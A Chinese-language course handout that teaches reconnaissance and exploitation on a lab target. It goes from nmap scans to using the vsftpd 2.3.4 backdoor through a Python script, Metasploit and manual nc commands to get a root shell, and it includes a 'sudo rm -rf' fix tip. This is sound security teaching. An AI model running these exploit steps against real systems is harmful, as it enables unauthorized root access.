# 從偵察到拿下一個 shell

面對一台不認識的機器，我們一開始並不知道它跑了哪些服務、哪些服務可能有漏洞。所以第一步是**偵察（reconnaissance）**：用掃描蒐集資訊，弄清楚目標開了哪些連接埠、上面跑什麼服務與版本，再根據這些線索去查有沒有對應的已知漏洞。

這份講義以一台實驗靶機為例，從 nmap 掃描開始，一路示範怎麼分析結果、查已知漏洞，最後在這個授權的練習環境裡驗證漏洞、取得一個 shell（一個能在目標機器上下指令的操作介面）。全程以 21 埠的 vsftpd 2.3.4 這個服務為例。

整條路其實就是一條攻擊鏈：**偵察 → 查漏洞利用 → 取得 shell → 確認權限**。下面六個步驟就是把這條鏈走完。

---

## 步驟一：掃出開放的連接埠

先確認目標開了哪些埠：

```bash
nmap -p- <靶機IP>
```

`-p-` 會掃完全部 65535 個埠，只回報每個埠「開」或「關」，所以跑得快。結果是一排開放的埠，例如 21、22、23、80、445。此時只知道哪些門開著，還不知道門後是什麼服務。

## 步驟二：辨識服務與版本

針對剛才找到的開放埠，再問它們各自跑什麼服務、什麼版本：

```bash
nmap -sV -p21,22,23,80,445 <靶機IP>
```

`-sV` 會連上每個開放埠，讀取服務回報的自我介紹字串（banner），推斷出服務名稱與版本號。版本是很重要的線索——許多漏洞只存在於特定版本，知道版本才能接著查有沒有對應的已知漏洞。輸出大致像這樣：

```
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 4.7p1 Debian
23/tcp  open  telnet   Linux telnetd
80/tcp  open  http     Apache httpd 2.2.8
445/tcp open  netbios  Samba smbd 3.x
```

## 步驟三：把結果整理成可判斷的清單

一台靶機掃下來常有十幾、二十個服務，盯著整頁輸出很難取捨。把它整理成一張表，替每個服務補上一句「這個版本意味著什麼」，哪些值得深入就浮出來了：

| 埠 | 服務 | 版本 | 備註 |
|---|---|---|---|
| 21 | ftp | vsftpd 2.3.4 | 已知含後門的版本 |
| 22 | ssh | OpenSSH 4.7p1 | 版本較舊，但無現成後門 |

這一步是把雜亂的輸出轉成能比較、能取捨的資訊。範例中 21 埠的 vsftpd 2.3.4 特別突出——這個版本有公開的後門，下面就以它示範完整的利用流程。

## 步驟四：查這個版本怎麼被利用

鎖定目標後，要先了解它實際怎麼被觸發。這類資訊有兩個常用來源。

一是 nmap 的漏洞腳本：掃描時加上 `--script vuln`，它會對服務跑一批已知漏洞檢查，命中的標成 `VULNERABLE`，並附上 `CVE`（漏洞的全球編號）和 `References`，後者往往直接指向可用的利用程式：

```bash
nmap -sV --script vuln -p21 <靶機IP>
```
```
21/tcp open ftp vsftpd 2.3.4
| ftp-vsftpd-backdoor:
|   VULNERABLE: vsftpd 2.3.4 backdoor ... CVE:CVE-2011-2523
|_  References: https://.../exploits/...
```

（這條若跑出來是空的，通常是沒搭配 `-sV`、拿不到版本，或靶機被前一輪操作弄到異常狀態——重開或還原快照再掃即可。）

二是 searchsploit，離線版的 Exploit-DB，用服務加版本查：

```bash
searchsploit vsftpd 2.3.4
```
```
--------------------------------------------------------- ------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ------------------------
vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb
--------------------------------------------------------- ------------------------
```

右邊 `Path` 欄是每支利用程式的位置，後面要用的路徑都從這裡取。這裡有兩支：一支獨立的 Python 腳本（`49757.py`），一支標了 `(Metasploit)`，是 metasploit（簡稱 msf）裡的現成模組。先用 `-x` 把 Python 那支打開來看它怎麼運作：

```bash
searchsploit -x unix/remote/49757.py
```

腳本不長，關鍵是這幾行：

```python
user = "USER nergal:)"        # 送一個結尾帶 :) 的帳號
tn  = Telnet(host, 21)        # 連 21 埠，把這個帳號送過去
tn2 = Telnet(host, 6200)      # 後門開在 6200，連進去
tn2.interact()                # 得到一個 shell
```

機制很清楚：在 21 埠送一個結尾是 `:)` 的帳號會觸發後門，後門在 6200 埠開出一個 root（最高權限）shell，這就是 CVE-2011-2523。其中帳號名稱本身不重要，關鍵只有結尾的 `:)`；6200 也不是隨便的數字，就是腳本裡 `Telnet(host, 6200)` 指定的後門埠。

機制清楚之後，實際要拿到 shell 有幾種做法，差別只在交給工具到什麼程度：

| 做法 | 來源 | 特點 |
|---|---|---|
| 獨立腳本 `49757.py` | searchsploit 的 Path 欄 | 複製下來直接跑，最直接 |
| msf 模組 | 同一張表標 `(Metasploit)` 的那支 | 用框架完成觸發，方便接後續操作 |
| 純 `nc` | 照上面的機制自己手動做 | 不依賴任何利用工具 |

## 步驟五：取得 shell

下面把三種做法各走一次，結果都是拿到 root。

獨立腳本最直接，複製下來帶上目標 IP 就跑：

```bash
searchsploit -m unix/remote/49757.py
python3 49757.py <靶機IP>             # → Success, shell opened
```

用 metasploit 的話，先在 msfconsole 裡搜出模組：

```text
msfconsole -q
msf6 > search vsftpd
```
```
Matching Modules
================

   #  Name                                  Rank       Check  Description
   -  ----                                  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

`Name` 欄就是模組路徑，也就是剛才 searchsploit 標 `(Metasploit)` 的那支。載入它，再用 `show options` 看它要哪些參數——這個模組只需要 `RHOSTS`（目標 IP）：

```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > show options
msf6 > set RHOSTS <靶機IP>
msf6 > exploit
```

> msf 第一次啟動偏慢，等 `msf6 >` 出現再操作。若它卡住並報 `Too many levels of symbolic links`，執行 `sudo rm -rf /usr/lib/llvm-16/build` 後再開一次。

若不想靠任何工具，照步驟四讀到的機制，用 nc 手動做那兩步也行：

```bash
# 終端 1：連 21 埠，送出結尾帶 :) 的帳號觸發後門
nc <靶機IP> 21
USER x:)
PASS x
# 終端 2：連後門所在的 6200 埠
nc <靶機IP> 6200
id
```

三種做法連上後打 `id`，都會看到 `uid=0(root)`。

## 步驟六：確認取得的權限

拿到 shell 後，先確認自己的身分與權限：

```bash
id ; whoami
ls -la /root
```

看到自己是 root，就達成本堂目標。這份練習到「取得一個 shell、確認權限」為止，不再往下拿更高權限或深入系統。

---

## 接下來

走完這一條，回頭看就是這六步：**掃 → 讀 → 挑 → 查 → 打 → 進去看**。作業請在同一台靶機上，自己挑另一個服務，照同樣的方法走一遍——題目與繳交方式見 eeclass 作業區的 [A3 - Recon to Shell](https://ncueeclass.ncu.edu.tw/course/homework/74604)。
